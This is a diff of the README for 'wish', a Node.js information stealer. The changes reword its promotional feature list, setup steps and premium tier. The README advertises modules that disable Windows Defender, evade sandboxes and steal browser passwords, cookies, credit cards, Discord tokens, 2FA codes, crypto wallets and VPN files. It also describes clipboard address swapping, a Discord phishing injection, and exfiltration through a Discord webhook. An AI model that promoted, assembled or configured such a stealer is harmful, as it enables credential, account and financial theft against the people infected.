@@ -1,24 +1,24 @@
-[shield-github-issues]: https://img.shields.io/github/issues/k4itrun/wish?style=for-the-badge&color=dc67ff
-[shield-github-license]: https://img.shields.io/github/license/k4itrun/wish?style=for-the-badge&color=dc67ff
-[shield-github-stars]: https://img.shields.io/github/stars/k4itrun/wish?style=for-the-badge&color=dc67ff
-[shield-github-forks]: https://img.shields.io/github/forks/k4itrun/wish?style=for-the-badge&color=dc67ff
+[shield-github-issues]: https://img.shields.io/github/issues/k4itrun/wish?style=for-the-badge&color=ffffff
+[shield-github-license]: https://img.shields.io/github/license/k4itrun/wish?style=for-the-badge&color=ffffff
+[shield-github-stars]: https://img.shields.io/github/stars/k4itrun/wish?style=for-the-badge&color=ffffff
+[shield-github-forks]: https://img.shields.io/github/forks/k4itrun/wish?style=for-the-badge&color=ffffff
 
 [github-assets-img-config-link]: .github/assets/config.png
 
+[github-assets-img-system1-link]: .github/assets/system1.png
+[github-assets-img-system2-link]: .github/assets/system2.png
 [github-assets-img-browsers-link]: .github/assets/browsers.png
-[github-assets-img-sessioninstagram-link]: .github/assets/sessioninstagram.png
-[github-assets-img-sessionspotify-link]: .github/assets/sessionspotify.png
-[github-assets-img-sessiontiktok-link]: .github/assets/sessiontiktok.png
 [github-assets-img-keywords-link]: .github/assets/keywords.png
-[github-assets-img-commonfiles-link]: .github/assets/commonfiles.png
+[github-assets-img-sessionspotify-link]: .github/assets/sessionspotify.png
+[github-assets-img-sessioninstagram-link]: .github/assets/sessioninstagram.png
+[github-assets-img-sessiontiktok-link]: .github/assets/sessiontiktok.png
 [github-assets-img-games-link]: .github/assets/games.png
-[github-assets-img-discordinjection-link]: .github/assets/discordinjection.png
-[github-assets-img-socials-link]: .github/assets/socials.png
-[github-assets-img-codes-link]: .github/assets/codes.png
-[github-assets-img-system-link]: .github/assets/system.png
+[github-assets-img-commonfiles-link]: .github/assets/commonfiles.png
+[github-assets-img-stealcodes-link]: .github/assets/stealcodes.png
 [github-assets-img-tokens-link]: .github/assets/tokens.png
-[github-assets-img-vpns-link]: .github/assets/vpns.png
 [github-assets-img-wallets-link]: .github/assets/wallets.png
+[github-assets-img-vpns-link]: .github/assets/vpns.png
+[github-assets-img-socials-link]: .github/assets/socials.png
 [github-assets-img-wish-link]: .github/assets/wish.png
 [github-assets-img-files-link]: .github/assets/files.png
 
@@ -67,38 +67,40 @@ The most comprehensive open-source stealer based on Node.js available on GitHub.
 - If you're wondering where the previous "AuraThemes" repository was, it was simply abandoned by the creation of this new one.
 
 ### Features (+50)
+
 - [Development][github-link]
-   - Clean and efficient code.
+   - Clean and efficient codebase.
    - Up-to-date dependencies.
    - Minimal reliance on external Node.js libraries.
 - [Modules][github-link]
    - [antidebug](src/modules/antidebug/antidebug.js): Terminates debugging tools (incomplete).
-   - [antivirus](src/modules/antivirus/antivirus.js): Disables Windows Defender and blocks antivirus websites.
-   - [antivm](src/modules/antivm/antivm.js): Terminates if running in a virtual machine.
+   - [antivirus](src/modules/antivirus/antivirus.js): Disables Windows Defender and blocks access to antivirus-related websites.
+   - [antivm](src/modules/antivm/antivm.js): Terminates execution if running inside a virtual machine environment.
    - [browsers](src/modules/browsers/browsers.js): 
-      - Captures logins, cookies, credit cards, bookmarks, autofills, history, and downloads from 37 Chromium-based browsers.
-      - Captures logins, cookies, history, bookmarks, and downloads from 10 Gecko/Firefox browsers.
-   - [sessions](src/modules/browsers/sessions.js): Take open sessions like spotify, tiktok, instagram.
-   - [clipper](src/modules/clipper/clipper.js): Monitors clipboard for crypto addresses and replaces them with predefined ones.
-   - [commonfiles](src/modules/commonfiles/commonfiles.js): Collects sensitive files from common directories.
-   - [fakerror](src/modules/fakeerror/fakeerror.js): Misleads the user into thinking the program has crashed.
-   - [games](src/modules/games/games.js): Extracts sessions from various game launchers, including Epic Games, Uplay, Minecraft, and Riot Games.
-   - [hideconsole](src/modules/hideconsole/hideconsole.js): Conceals the console.
-   - [injections](src/modules/injections): Injects into Discord and wallets to capture private information.
+      - Captures logins, cookies, credit card details, bookmarks, autofill data, browsing history, and downloads from 37 Chromium-based browsers.
+      - Captures logins, cookies, browsing history, bookmarks, and downloads from 10 Gecko/Firefox-based browsers.
+   - [sessions](src/modules/browsers/sessions.js): Extracts active sessions from platforms like Spotify, TikTok, and Instagram.
+   - [clipper](src/modules/clipper/clipper.js): Monitors the clipboard for cryptocurrency addresses and replaces them with predefined addresses.
+   - [commonfiles](src/modules/commonfiles/commonfiles.js): Collects sensitive files from common directories on the system.
+   - [fakeerror](src/modules/fakeerror/fakeerror.js): Displays a fake error message to trick users into thinking the program has crashed.
+   - [games](src/modules/games/games.js): Extracts session data from popular game launchers such as Epic Games, Uplay, Minecraft, and Riot Games.
+   - [hideconsole](src/modules/hideconsole/hideconsole.js): Hides the console window to run the program discreetly.
+   - [injections](src/modules/injections): Injects into applications like Discord and crypto wallets to capture sensitive information.
       - [discord](src/modules/injections/discord/discord.js):
-         - Captures login, registration, and 2FA requests.
-         - Captures email/password changes and backup code requests.
-         - Blocks QR code logins and device views.
-         - Phishing mode simulates alerts to trick victims into changing their email.
-   - [killprocess](src/modules/killprocess/killprocess.js): Terminates processes.
-   - [socials](src/modules/socials/socials.js): Manages social media files.
-   - [startup](src/modules/startup/startup.js): Ensures the program starts with the system.
-   - [stealcodes](src/modules/stealcodes/stealcodes.js): Captures 2FA codes from Discord, GitHub, Google, and more.
-   - [system](src/modules/system/system.js): Gathers information on IP address, CPU, GPU, RAM, location, and saved Wi-Fi networks.
-   - [tokens](src/modules/tokens/tokens.js): Harvests tokens from four Discord apps and various browsers.
-   - [vpns](src/modules/vpns/vpns.js): Collects VPN data.
-   - [wallets](src/modules/wallets/wallets.js): Captures wallet information.
-  
+         - Persistent startup injection (remains active even if the user attempts to remove it).
+         - Captures logins, registration data, and two-factor authentication requests.
+         - Intercepts email and password change requests as well as backup code requests.
+         - Blocks QR code logins and views of connected devices.
+         - Phishing mode simulates alerts to trick users into changing their email credentials.
+   - [killprocess](src/modules/killprocess/killprocess.js): Terminates processes that are listed in a predefined blacklist.
+   - [socials](src/modules/socials/socials.js): Extracts data from over 20 social media applications, stealing sensitive information from each.
+   - [startup](src/modules/startup/startup.js): Ensures the program launches automatically when the system starts.
+   - [stealcodes](src/modules/stealcodes/stealcodes.js): Captures two-factor authentication (2FA) codes from services like Discord, GitHub, Google, and more.
+   - [system](src/modules/system/system.js): Gathers detailed system information including IP address, installed antivirus software, screenshots, CPU, GPU, RAM details, location, and saved Wi-Fi networks.
+   - [tokens](src/modules/tokens/tokens.js): Extracts tokens from four Discord applications and over 30 browsers.
+   - [vpns](src/modules/vpns/vpns.js): Retrieves sensitive files from over 20 VPN applications installed on the system.
+   - [wallets](src/modules/wallets/wallets.js): Extracts data from more than 30 browser-based cryptocurrency wallets, as well as crucial information from locally installed wallets.
+
 ## Getting Started
 
 ### Requirements
@@ -129,6 +131,7 @@ npm install
 ```
 
 3. Edit `config.js` for your Discord webhook and crypto addresses.
+
 ![][github-assets-img-config-link]
 
 ## Usage
@@ -137,28 +140,28 @@ npm install
 npm run start or node index
 ```
 
-2. but if you are thinking of creating an executable you can choose to use **(`electron-builder`, `pkg`, etc...)**
+2. but if you are thinking of creating an executable you can choose to use (`electron-builder`, `pkg`, etc...)
 
 ## Preview
-![][github-assets-img-system-link]
+![][github-assets-img-system1-link]
+![][github-assets-img-system2-link]
 ![][github-assets-img-browsers-link]
-![][github-assets-img-sessioninstagram-link]
-![][github-assets-img-sessionspotify-link]
-![][github-assets-img-sessiontiktok-link]
 ![][github-assets-img-keywords-link]
-![][github-assets-img-games-link]
+![][github-assets-img-sessionspotify-link]
+![][github-assets-img-sessioninstagram-link]
+![][github-assets-img-sessiontiktok-link]
 ![][github-assets-img-commonfiles-link]
-![][github-assets-img-codes-link]
+![][github-assets-img-stealcodes-link]
 ![][github-assets-img-tokens-link]
+![][github-assets-img-games-link]
 ![][github-assets-img-wallets-link]
 ![][github-assets-img-vpns-link]
 ![][github-assets-img-socials-link]
-![][github-assets-img-discordinjection-link]
 ![][github-assets-img-wish-link]
 ![][github-assets-img-files-link]
 
 ### Premium Features
-- **Marked features**: Premium  
+- Marked features: Premium  
    - [ ] Upload files
    - [ ] Update/Reinstall Bypass
    - [ ] File/session theft
